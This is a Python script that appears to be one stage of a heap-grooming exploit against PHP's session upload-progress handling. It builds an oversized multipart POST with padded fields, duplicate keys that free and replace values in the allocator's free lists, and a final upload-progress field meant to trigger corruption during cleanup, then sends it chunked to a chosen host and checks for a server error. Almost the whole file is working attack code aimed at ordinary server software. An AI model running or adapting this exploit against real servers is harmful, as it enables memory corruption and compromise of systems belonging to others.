#!/usr/bin/env python3
"""A1 producer: exhaust bin/page state at upload-progress END cleanup."""

from __future__ import annotations

import argparse
import socket

from common import Part, iter_multipart, recv_all, status_code
from profiles import DEFAULT_PROFILE, PROFILES


A1_BOUNDARY = b"codex843a1boundary"


def padded(prefix: bytes, length: int, fill: bytes) -> bytes:
    if length <= len(prefix):
        return prefix
    return prefix + fill * (length - len(prefix))


def a1_parts(
    *,
    sid_size: int,
    sid_late: bool,
    files: int,
    depth: int,
    live_files: int,
    ct1: int,
    ct2: int,
    fillers: int,
    filler_name: int,
    filler_value: int,
    big: int,
    big_size: int,
    big_name: int,
    big_name_count: int,
    big_alt_name: int,
    tail_big_size: int,
    tail_big_count: int,
    burners: int,
    burner_size: int,
    burner_name: int,
    burner_long_name_count: int,
    burner_long_name: int,
    late_groom_fields: int,
    late_groom_name: int,
    late_groom_value: int,
    late_groom_alt_value_count: int,
    late_groom_alt_value: int,
    released_fields: int,
    released_name: int,
    released_value: int,
    released_alt_value_count: int,
    released_alt_value: int,
    released_replacement_value: int,
    released_long_replacement_count: int,
    released_long_replacement_value: int,
    progress_size: int,
) -> list[Part]:
    sid = Part(b"PHPSESSID", b"\0" + b"I" * max(0, sid_size - 1))
    parts = [] if sid_late else [sid]
    suffix = b"[a]" * depth
    for index in range(files):
        filename = b""
        content_type = None
        if index == 0 and live_files >= 1:
            filename = b"A"
            content_type = b"A" * ct1
        elif index == 1 and live_files >= 2:
            filename = b"A"
            content_type = b"A" * ct2
        parts.append(Part(f"u{index:04d}".encode() + suffix, b"", filename, content_type))
    for index in range(fillers):
        parts.append(
            Part(
                padded(f"f{index:03d}".encode(), filler_name, b"F"),
                b"v" * filler_value,
            )
        )
    for index in range(big):
        name_length = big_name if big_name_count < 0 or index < big_name_count else big_alt_name
        value_size = tail_big_size if tail_big_size >= 0 and index >= big - tail_big_count else big_size
        parts.append(
            Part(
                padded(f"g{index:03d}".encode(), name_length, b"G"),
                b"G" * value_size,
            )
        )
    for index in range(burners):
        name_length = (
            burner_long_name
            if index >= burners - burner_long_name_count
            else burner_name
        )
        parts.append(
            Part(
                padded(f"b{index:03d}".encode(), name_length, b"B"),
                b"B" * burner_size,
            )
        )
    for index in range(late_groom_fields):
        value_size = (
            late_groom_alt_value
            if index >= late_groom_fields - late_groom_alt_value_count
            else late_groom_value
        )
        parts.append(
            Part(
                padded(f"l{index:03d}".encode(), late_groom_name, b"L"),
                b"L" * value_size,
            )
        )
    # Duplicate keys release the first retained value while preserving its
    # bytes in the selected small-bin free list for later session allocations.
    released_names = [
        padded(f"r{index:03d}".encode(), released_name, b"R")
        for index in range(released_fields)
    ]
    for index, name in enumerate(released_names):
        value_size = (
            released_alt_value
            if index >= released_fields - released_alt_value_count
            else released_value
        )
        parts.append(Part(name, b"R" * value_size))
    for index, name in enumerate(released_names):
        replacement_value = (
            released_long_replacement_value
            if index >= released_fields - released_long_replacement_count
            else released_replacement_value
        )
        parts.append(Part(name, b"r" * replacement_value))
    if sid_late:
        parts.append(sid)
    # Deliberately last: MULTIPART_EVENT_END becomes the first session
    # operation after the heap has been filled by all preceding fields.
    parts.append(Part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_size))
    return parts


def send_a1(
    host: str,
    port: int,
    path: str,
    parts: list[Part],
    *,
    chunk_size: int = 16384,
) -> bytes:
    """Send A1 with profile-selected transport segmentation."""
    if chunk_size < 1:
        raise ValueError("chunk_size must be positive")
    body = b"".join(iter_multipart(parts, A1_BOUNDARY))
    sock = socket.create_connection((host, port), timeout=30)
    sock.settimeout(30)
    sock.sendall(
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={A1_BOUNDARY.decode()}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n\r\n".encode()
    )
    try:
        for offset in range(0, len(body), chunk_size):
            chunk = body[offset : offset + chunk_size]
            sock.sendall(f"{len(chunk):x}\r\n".encode())
            sock.sendall(chunk)
            sock.sendall(b"\r\n")
        sock.sendall(b"0\r\n\r\n")
        return recv_all(sock, 1 << 20)
    finally:
        sock.close()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host", nargs="?", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18835)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--profile", choices=PROFILES, default=DEFAULT_PROFILE)
    ap.add_argument("--query-params", type=int)
    ap.add_argument("--query-name", type=int)
    ap.add_argument("--query-value", type=int)
    ap.add_argument("--query-long-name-count", type=int)
    ap.add_argument("--query-long-name", type=int)
    ap.add_argument("--query-released-fields", type=int)
    ap.add_argument("--query-released-name", type=int)
    ap.add_argument("--query-released-value", type=int)
    ap.add_argument("--query-released-replacement", type=int)
    ap.add_argument("--query-released-long-replacement-count", type=int)
    ap.add_argument("--query-released-long-replacement", type=int)
    ap.add_argument("--query-secondary-released-fields", type=int)
    ap.add_argument("--query-secondary-released-name", type=int)
    ap.add_argument("--query-secondary-released-value", type=int)
    ap.add_argument("--query-secondary-released-replacement", type=int)
    ap.add_argument("--sid-size", type=int)
    ap.add_argument("--sid-late", dest="sid_late", action="store_true")
    ap.add_argument("--sid-early", dest="sid_late", action="store_false")
    ap.set_defaults(sid_late=None)
    ap.add_argument("--files", type=int)
    ap.add_argument("--depth", type=int)
    ap.add_argument("--live-files", type=int)
    ap.add_argument("--ct1", type=int)
    ap.add_argument("--ct2", type=int)
    ap.add_argument("--fillers", type=int)
    ap.add_argument("--filler-name", type=int)
    ap.add_argument("--filler-value", type=int)
    ap.add_argument("--big", type=int)
    ap.add_argument("--big-size", type=int)
    ap.add_argument("--big-name", type=int)
    ap.add_argument("--big-name-count", type=int)
    ap.add_argument("--big-alt-name", type=int)
    ap.add_argument("--tail-big-size", type=int)
    ap.add_argument("--tail-big-count", type=int)
    ap.add_argument("--burners", type=int)
    ap.add_argument("--burner-size", type=int)
    ap.add_argument("--burner-name", type=int)
    ap.add_argument("--burner-long-name-count", type=int)
    ap.add_argument("--burner-long-name", type=int)
    ap.add_argument("--late-groom-fields", type=int)
    ap.add_argument("--late-groom-name", type=int)
    ap.add_argument("--late-groom-value", type=int)
    ap.add_argument("--late-groom-alt-value-count", type=int)
    ap.add_argument("--late-groom-alt-value", type=int)
    ap.add_argument("--released-fields", type=int)
    ap.add_argument("--released-name", type=int)
    ap.add_argument("--released-value", type=int)
    ap.add_argument("--released-alt-value-count", type=int)
    ap.add_argument("--released-alt-value", type=int)
    ap.add_argument("--released-replacement-value", type=int)
    ap.add_argument("--released-long-replacement-count", type=int)
    ap.add_argument("--released-long-replacement-value", type=int)
    ap.add_argument("--progress-size", type=int)
    args = ap.parse_args()

    profile = PROFILES[args.profile]
    a1 = profile.a1

    def selected(value, default):
        return default if value is None else value

    path = args.path
    query_params = selected(args.query_params, a1.query_params)
    query_name = selected(args.query_name, a1.query_name_length)
    query_value = selected(args.query_value, a1.query_value_length)
    query_long_name_count = selected(
        args.query_long_name_count, a1.query_long_name_count,
    )
    query_long_name = selected(
        args.query_long_name, a1.query_long_name_length,
    )
    query_released_fields = selected(
        args.query_released_fields, a1.query_released_fields,
    )
    query_secondary_released_fields = selected(
        args.query_secondary_released_fields,
        a1.query_secondary_released_fields,
    )
    if query_params or query_released_fields or query_secondary_released_fields:
        separator = "&" if "?" in path else "?"
        query = []
        for i in range(query_params):
            prefix = f"q{i:07d}"
            selected_name = (
                query_long_name
                if i >= query_params - query_long_name_count
                else query_name
            )
            query.append(prefix.ljust(selected_name, "Q") + "=" + "v" * query_value)
        release_name = selected(
            args.query_released_name, a1.query_released_name_length,
        )
        release_value = selected(
            args.query_released_value, a1.query_released_value_length,
        )
        release_replacement = selected(
            args.query_released_replacement,
            a1.query_released_replacement_length,
        )
        release_long_replacement_count = selected(
            args.query_released_long_replacement_count,
            a1.query_released_long_replacement_count,
        )
        release_long_replacement = selected(
            args.query_released_long_replacement,
            a1.query_released_long_replacement_length,
        )
        release_names = [
            f"r{i:03d}".ljust(release_name, "R")
            for i in range(query_released_fields)
        ]
        for name in release_names:
            query.append(name + "=" + "R" * release_value)
        for i, name in enumerate(release_names):
            replacement_length = (
                release_long_replacement
                if i >= query_released_fields - release_long_replacement_count
                else release_replacement
            )
            query.append(name + "=" + "r" * replacement_length)
        secondary_name = selected(
            args.query_secondary_released_name,
            a1.query_secondary_released_name_length,
        )
        secondary_value = selected(
            args.query_secondary_released_value,
            a1.query_secondary_released_value_length,
        )
        secondary_replacement = selected(
            args.query_secondary_released_replacement,
            a1.query_secondary_released_replacement_length,
        )
        secondary_names = [
            f"s{i:03d}".ljust(secondary_name, "S")
            for i in range(query_secondary_released_fields)
        ]
        for name in secondary_names:
            query.append(name + "=" + "S" * secondary_value)
        for name in secondary_names:
            query.append(name + "=" + "s" * secondary_replacement)
        path += separator + "&".join(query)
    parts = a1_parts(
        sid_size=selected(args.sid_size, a1.sid_size),
        sid_late=selected(args.sid_late, a1.sid_late),
        files=selected(args.files, a1.files),
        depth=selected(args.depth, a1.depth),
        live_files=selected(args.live_files, a1.live_files),
        ct1=selected(args.ct1, a1.content_type_1),
        ct2=selected(args.ct2, a1.content_type_2),
        fillers=selected(args.fillers, a1.fillers),
        filler_name=selected(args.filler_name, a1.filler_name),
        filler_value=selected(args.filler_value, a1.filler_value),
        big=selected(args.big, a1.big),
        big_size=selected(args.big_size, a1.big_size),
        big_name=selected(args.big_name, a1.big_name),
        big_name_count=selected(args.big_name_count, a1.big_name_count),
        big_alt_name=selected(args.big_alt_name, a1.big_alt_name),
        tail_big_size=selected(args.tail_big_size, a1.tail_big_size),
        tail_big_count=selected(args.tail_big_count, a1.tail_big_count),
        burners=selected(args.burners, a1.burners),
        burner_size=selected(args.burner_size, a1.burner_size),
        burner_name=selected(args.burner_name, a1.burner_name),
        burner_long_name_count=selected(
            args.burner_long_name_count, a1.burner_long_name_count,
        ),
        burner_long_name=selected(
            args.burner_long_name, a1.burner_long_name,
        ),
        late_groom_fields=selected(args.late_groom_fields, a1.late_groom_fields),
        late_groom_name=selected(args.late_groom_name, a1.late_groom_name),
        late_groom_value=selected(args.late_groom_value, a1.late_groom_value),
        late_groom_alt_value_count=selected(
            args.late_groom_alt_value_count, a1.late_groom_alt_value_count,
        ),
        late_groom_alt_value=selected(
            args.late_groom_alt_value, a1.late_groom_alt_value,
        ),
        released_fields=selected(args.released_fields, a1.released_fields),
        released_name=selected(args.released_name, a1.released_name),
        released_value=selected(args.released_value, a1.released_value),
        released_alt_value_count=selected(
            args.released_alt_value_count, a1.released_alt_value_count,
        ),
        released_alt_value=selected(
            args.released_alt_value, a1.released_alt_value,
        ),
        released_replacement_value=selected(
            args.released_replacement_value, a1.released_replacement_value,
        ),
        released_long_replacement_count=selected(
            args.released_long_replacement_count,
            a1.released_long_replacement_count,
        ),
        released_long_replacement_value=selected(
            args.released_long_replacement_value,
            a1.released_long_replacement_value,
        ),
        progress_size=selected(args.progress_size, a1.progress_size),
    )
    response = send_a1(
        args.host, args.port, path, parts, chunk_size=a1.transport_chunk_size,
    )
    head = response.partition(b"\r\n\r\n")[0]
    print(head[:4096].decode("latin1", "backslashreplace"))
    cookie_sent = b"set-cookie: phpsessid=" in head.lower()
    print(f"status={status_code(response)} response={len(response)} cookie_sent={cookie_sent}")
    return 0 if status_code(response) == 500 and not cookie_sent else 2


if __name__ == "__main__":
    raise SystemExit(main())
